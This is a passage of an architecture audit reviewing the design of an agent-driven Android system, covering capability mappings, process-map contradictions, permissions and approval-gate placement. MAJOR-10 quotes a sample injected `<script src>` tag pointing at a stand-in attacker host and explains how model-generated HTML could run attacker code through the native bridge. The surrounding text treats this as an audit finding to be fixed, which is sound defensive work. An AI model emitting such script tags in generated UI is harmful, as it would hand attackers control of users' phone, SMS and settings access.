@@ -1,0 +1,94 @@
+[line 126 of docs/P4-ARCH-AUDIT.md]
+126|### MAJOR-8 — "27-method surface maps almost 1:1" is false; Bluetooth, vibrate and NFC are dropped without a marked decision
+127|**Audited doc:** §2.1 line 71; §3 table lines 87-101; §8 migration table line 236.
+128|**Violates:** SPEC-002 L2 adaptation completeness (the marked L2 line says the broker is *"the sole Phosphor-side component that talks to telephony/contacts/settings"* — silently dropping Bluetooth from an L2 translation that names it explicitly), and the vision's §Intended architecture item 3 (*"Sensors, vibration, flashlight, NFC, clipboard, and other hardware"*).
+129|
+130|Verified by enumerating `bridge/src/handlers.rs` dispatch arms (exactly **27**): `tel.{dial,hangup,answer,status}`, `sms.{send,inbox}`, `geo.{get,watch,unwatch}`, `wifi.{status,list}`, **`bt.list`, `bt.connect`**, `sensor.read`, `battery`, `clip.{read,write}`, `notif.{set,cancel}`, **`vibrate`**, `flashlight`, `camera.snapshot`, `screen.{idle,wake}`, `brightness`, `app.open`, `app.share`, `tts.speak`, `web.fetch`, `kv.{get,set}`.
+131|
+132|The §3 broker inventory contains **no Bluetooth row at all** (SPEC-002 §4 L2 explicitly names Bluetooth as an arbiter responsibility: *"sole owner of modem (ModemManager), GPS (geoclue), Bluetooth (bluez), camera"*), **no vibrate**, **no NFC** (vision line 81 names NFC and vibration explicitly), and **no calendar/alarms** (vision line 83: *"Calendar, alarms, and other user data where permitted"*). Meanwhile the doc *adds* `contacts.search`/`contacts.read` and `notif.listen` and claims the mapping is 1:1.
+133|
+134|Three prototype methods are silently dropped, one SPEC-002-named arbiter domain is silently dropped, and four vision-listed hardware capabilities are absent. Each is defensible as "later phase" — but the document's own framing rule (§0 line 15) requires adaptations and drops to be *marked*, and this is a drop with no marker and a factually incorrect "almost 1:1" claim on top. Either add the rows (with Phase-N deferral notes) or add the drop to the recorded-concepts list at §0.
+135|
+136|### MAJOR-9 — Process map contradicts the component sections on four points; OQ-3 is pre-decided inside §8
+137|**Audited doc:** §2.1 lines 65-67, §2.2 line 76, §4 line 124, §5 step 1 line 134, §6.2 line 154, §8 map lines 203-228, §9 OQ-3 line 248.
+138|**Violates:** audit criterion 3 (process map must match §1–§7 — same processes, same trust positions, same IPC paths) and criterion 5 (recommendations must not quietly decide open questions).
+139|
+140|1. **OQ-3 is answered in the diagram.** OQ-3 (line 248) poses approval-card hosting as *open*, recommending **broker-hosted**. §6.2 line 154 keeps it open (*"hosted by the broker or shell process — **OQ-3**"*). But §8's process map draws **`native approval dialog UI (content from broker registry)` inside the `PhosphorShell` box** (line 207) — i.e. the diagram decides *shell-hosted*, the opposite of the doc's own recommendation, while §9 still presents it as undecided. A reader implementing from §8 gets the weaker design.
+141|2. **The shell does and does not hold capability permissions.** §2.1 line 67: shell has *"No capability permissions of its own — it asks the broker like any client."* §5 step 1 line 134: *"mic is a runtime/foreground permission of the *shell*"*. `RECORD_AUDIO` **is** a capability permission. The trust-position statement is false as written.
+142|3. **agentd → shell binder calls.** §2.1 line 65: agentd's powers are *"compute, network egress …, and binder calls *to* the broker"*. §8 sepolicy line 228: *"neverallow agentd binder calls except to broker **+ shell**"*. The sepolicy requirement grants a second privileged path the trust table denies — and the shell is the process holding the bridge to page JS.
+143|4. **Shell ↔ agentd channel is unspecified and unanalysed.** §8 line 218 labels it *"binder AIDL / local socket"* — an undecided mechanism rendered as settled. This channel carries the turn (user text/audio in, screen HTML out) and is the path by which model output reaches the renderer. Given agentd is a native init-started daemon (line 65), an AIDL interface requires it to implement the binder wire protocol itself or be fronted by a Java service — the doc should say which. More importantly, this path is *outside* the broker's classification, so "every consequential capability crosses the broker's approval gate" (line 69) is true only for tool calls, not for the screen-render path. That asymmetry needs to be stated, because rendering is exactly where R-UI-1 (no script stripping) applies.
+144|
+145|MINOR-1 also belongs to this cluster (UID naming) and is listed below.
+146|
+147|### MAJOR-10 — The known HIGH defect from `docs/P4-AUDIT.md` H1 is silently not carried forward
+148|**Audited doc:** §1.1 line 42, §4 line 115.
+149|**Violates:** SPEC-001 R-UI-1/R-UI-3/R-UI-5 and the project's own audit trail; audit criterion 1 (silent gap).
+150|
+151|The existing audit `docs/P4-AUDIT.md` H1 (lines 25-40) establishes a *live, unremediated* finding against the prototype shell: `setScreen()` in `ios-app/app-shell.html` **resurrects `<script src>` to arbitrary origins**, and WKWebView does not route subresource loads through the navigation allowlist, so a single model-emitted `<script src="https://evil.example/x.js">` executes attacker code with access to the native bridge. The Phase-4 document's §4 table (line 115) asserts R-UI-1..3 are satisfied by *"agentd emits `<ph-screen>` HTML verbatim … WebView executes it"* — which reproduces exactly the condition H1 exploits, in a WebView that has a *more* powerful bridge (`phosphorApi` → broker RPC → telephony/SMS/settings).
+152|
+153|The doc's only gesture at this is line 42: *"CSP baseline forbids third-party CDN loads (R-UI-5)"* — but (a) R-UI-5 is a **SHOULD** about *system-prompt steering*, and it is silently upgraded to a technical control without a marker, and (b) a CSP baseline is not specified: no `script-src`/`connect-src` directive list, no statement of how a CSP is injected into agent-generated HTML without breaking R-UI-1/3 (`on*=` and inline `<script>` must keep working — so `script-src` must allow `'unsafe-inline'`, which does *not* by itself block remote `<script src>` unless a host allowlist is enumerated, and `'unsafe-inline'` + remote hosts is precisely the H1 path).
+154|
+155|Required: a §4 subsection specifying the subresource policy (drop `src`-carrying scripts, or an explicit host allowlist), the exact CSP directives, and a statement that this closes P4-AUDIT H1 on the Android host. Carrying an open HIGH finding into a new platform without a decision is the single most consequential omission in the document after BLOCKER-1.
+156|
+157|### MAJOR-11 — Two of six BUILD-PLAN Phase 4 deliverables are deferred behind the very open questions §3's inventory depends on
+158|**Audited doc:** §10 table lines 259-268; §9 OQ-3/OQ-4.
+159|**Violates:** BUILD-PLAN §Phase 4 deliverables (lines 252-257) and the exit criterion (line 261).
+160|
+161|| Deliverable | Doc status (line) |
+162||---|---|
+163|| System architecture document | this file — **delivered** |
+164|| Component and process map | §8 — **delivered** (with MAJOR-9 defects) |
+165|| Capability/API inventory | *"expand to full method-signature level after OQ-3/OQ-4"* (263) — **deferred** |
+166|| Data-flow and trust-boundary diagrams | *"formalize (graphs) on request"* (264) — **deferred** |
+167|| Policy model | §6.3, *"pattern-file schema draft"* outstanding (265) — **partial** |
+168|| Prototype-to-native migration map | §8 table — **delivered** (with MAJOR-8 defects) |
+169|
+170|Two deliverables are explicitly not delivered and a third is partial, while §268 nonetheless declares the exit criterion met *"pending the Captain's answers on OQ-1..OQ-8"*. The circularity is the problem: the full capability inventory is the artifact the exit criterion's "implementation locations understood without guessing" is measured *by*, and it cannot be written until OQ-3 (approval host) and OQ-4 (broker hosting) are settled. Phase 4 cannot close on this document alone; the acceptance should be conditional on the inventory landing, or the exit criterion should be re-scoped and that re-scoping marked as a Captain decision.
+171|
+172|---
+173|
+174|## MINOR
+175|
+176|### MINOR-1 — Three names for one UID across §2.1 and §8
+177|§2.1 line 65 gives agentd UID `AID_PHOSPHOR`; §8 line 198 gives `phosphor_agentd`. §2.1 line 66 gives broker `` `system` or dedicated AID ``; §8 line 209 gives *"UID: broker AID"*. Same intent, three spellings, and the broker's UID remains a choice (correctly, per OQ-4) but the map renders it as fixed. The map should carry the *decided* names only, with undecided ones marked as such.
+178|
+179|### MINOR-2 — `R-QUAR-5` is an invented SPEC-001 requirement ID
+180|§4 line 120: *"R-QUAR-5 → see §6.3 | system output as untrusted input | **new** (this phase)"*. SPEC-001 defines R-QUAR-1..4 only (verified by enumeration). The requirement the doc means is SPEC-002 **REC-5**, which the doc already cites correctly at line 162. Line 120 fabricates a SPEC-001 ID and duplicates REC-5, which will confuse any future traceability pass.
+181|
+182|### MINOR-3 — R-UI-5 silently converted from a prompt SHOULD into a CSP control
+183|§1.1 line 42 cites *"(R-UI-5)"* for *"CSP baseline forbids third-party CDN loads"*. R-UI-5 is *"The system prompt SHOULD steer the model toward maintainable UI JS (no obfuscation, no third-party CDN dependencies unless requested)"* — a prompt-level instruction. The substitution is a strengthening and probably a good idea, but it is a requirement-content change with no marker, which §0's framing rule forbids. (It does not fix MAJOR-10: see there.)
+184|
+185|### MINOR-4 — Notification-listener privilege level imprecise; the actual build-time knob is absent
+186|§3 line 92 says `BIND_NOTIFICATION_LISTENER_SERVICE` is a *"(privileged grant)"*. Verified `protectionLevel="signature"` (`AndroidManifest.xml:8426-8427`) — for a platform-signed broker that is simply satisfied, not "privileged". More useful and entirely absent: `config_defaultListenerAccessPackages` (`frameworks/base/core/res/res/values/config.xml:5122`, default `com.android.launcher3`) is the overlay key that grants notification-listener access *without* the user visiting Settings. For a design whose `notif.listen` is load-bearing (vision: "an incoming text arrives. Phosphor understands and classifies it"), that overlay entry is the concrete implementation location and belongs in §3.
+187|
+188|### MINOR-5 — `airplane.toggle` names neither the API nor its permission
+189|§3 line 93 lists `airplane.toggle` under Settings with no API. Verified: `ConnectivityManager.setAirplaneMode(boolean)` is `@SystemApi`, `@RequiresPermission(anyOf = {NETWORK_AIRPLANE_MODE, …})` (`packages/modules/Connectivity/framework/src/android/net/ConnectivityManager.java:3937-3943`), and `NETWORK_AIRPLANE_MODE` is `protectionLevel="signature"` (`AndroidManifest.xml:2471-2472`). A missing signature permission, in the row that MAJOR-6 already flags as self-contradictory.
+190|
+191|### MINOR-6 — Wi-Fi row omits the deprecation constraint that governs it
+192|§3 line 93 lists `wifi.list` (`WifiManager.startScan`). `setWifiEnabled` (which any `wifi.toggle` would need) is `@Deprecated` and *"for applications targeting Q or above, this API will always fail and return false"* except for DO/PO/system apps (`packages/modules/Wifi/framework/java/android/net/wifi/WifiManager.java:5490-5505`). The design put `wifi.toggle` in REC-4's DESTRUCTIVE set (line 161) without noting that the broker *must* be a system app for the call to work at all — which is an argument for OQ-4's standalone-platform-app option, and should be recorded as such.
+193|
+194|### MINOR-7 — `setTorchMode` does not require `CAMERA`; the doc's privilege shorthand overstates it
+195|§3 line 96 puts flashlight under a row whose privilege is *"`CAMERA` → broker"*. Verified `CameraManager.setTorchMode(String,boolean)` (`CameraManager.java:1531`) carries **no** `@RequiresPermission` — torch is gated by camera-service access, not by the `CAMERA` dangerous permission. Minor, but the inventory is meant to be the manifest source; `CAMERA` on the broker for torch alone would be an unnecessary grant.
+196|
+197|### MINOR-8 — Exit-criterion gate over-lists OQ-5/6/7, which are not Phase-4 blockers
+198|§268 gates the exit criterion on *"the Captain's answers on OQ-1..OQ-8"*, but §9 itself defers OQ-5 to Phase 12, OQ-6 to Phase 7 and OQ-7 to Phase 9. Only OQ-1 (Vanadium), OQ-2 (credential anchor), OQ-3 (card host) and OQ-4 (broker hosting) actually gate Phase 5 work. The gate should name those four; otherwise Phase 4 is blocked on decisions that are explicitly not needed yet.
+199|
+200|---
+201|
+202|## NOTE
+203|
+204|### NOTE-1 — OQ-1 is pre-decided in §1.1 while still posed as open
+205|§1.1 line 33 states as fact that with system WebView *"the rendering engine is GrapheneOS's hardened Vanadium WebView … with no added trust burden of our own"*; OQ-1 (line 246) then poses the choice and recommends (a). The recommendation is legitimate and labelled — but "no added trust burden of our own" contradicts SPEC-001 §14.2, which records that `app.vanadium.webview`'s signature **is not ours** and that *"if the shell is ever expected to enforce trust in the browser component itself, that signature is not ours yet."* The body text should carry that caveat rather than assert the burden away; the shell renders all agent-generated UI through that engine, so "the trust requirement is on the shell app, not the engine" (line 246) is a claim the Captain should accept explicitly, not inherit from a table cell.
+206|
+207|### NOTE-2 — Open questions are otherwise genuine, and recommendations are marked as recommendations
+208|OQ-2 (credential anchor), OQ-3 (card host), OQ-4 (broker hosting), OQ-8 (retiring SPEC-002 L1) are real architecture forks with material cost/risk asymmetries, correctly escalated, correctly recommending rather than deciding. OQ-8 in particular is honest: *"Needs the Captain's sign-off since it retires an entire SPEC-002 level"* — the right instinct. (OQ-3's recommendation is undermined by the §8 diagram; see MAJOR-9.1.)
+209|
+210|### NOTE-3 — §0's "concepts that do NOT translate" list is good practice and should be the model for MAJOR-8
+211|Recording eBPF/cgroup/PID-1 as superseded (line 19) and naming the SPEC-002 levels involved is exactly the discipline the framing rule asks for. Its existence is why the silent drops in MAJOR-8 stand out — the mechanism was built and then not used for the capability list.
+212|
+213|### NOTE-4 — SPEC-002 L1/L3/L4 adaptations are correct, non-hand-wave translations
+214|Spot-checked against the source: L1 (line 19 + OQ-8) correctly observes SELinux policy is compile-time and agent-authored eBPF is not viable on an Android kernel. L3 (line 105) correctly translates "no settings applications" to "Settings app remains as fallback; `Settings.Global/Secure` is the mechanism; agent never writes it directly" — with the privilege correction in MAJOR-6. L4 (line 79) correctly declines PID-1 ownership as a rewrite the vision forbids (vision: *"Modify and extend the platform rather than rewriting the kernel, modem stack, bootloader, or every Android component"*). L2 (line 71) is correct for telephony/contacts/settings but incomplete for Bluetooth (MAJOR-8). Markers REC-1, REC-3, REC-4, REC-5 are sound translations of their source requirements; REC-2 is not (BLOCKER-1).
+215|
+216|### NOTE-5 — Vision traps are not triggered; the prototype is migration-sourced, not architecture-sourced
+217|Checked against the vision's explicit "what Phosphor is not" list. The design does **not** become: a normal app calling stock Phone/Messages (broker calls framework APIs directly; §2.1 refusal to hold permissions in the shell), a chatbot on GrapheneOS (agentd is an init service with a UID/SELinux domain, §2.1-2.2), a browser shell as product (§1.1 explicitly rejects kiosk-browser and Custom Tabs, reasoning from the vision's "real operating-system surface rather than an isolated browser page"), or a Termux runtime (§8 migration table retires Termux/Termux:API/Termux:Boot; §2 formally retires `runtime/server.py`). The prototype is used as a *migration source* — method names preserved as tool vocabulary, `shell.html` as design reference only (§1.1 line 43: *"the prototype file is the design reference, **not** the shipped artifact"*) — which is what the vision permits. **PASS.** The residual risk is not shape but drift: §1.2 line 50 ke
+[... truncated; line window cut after 16384 bytes; continue with line=217 ...]
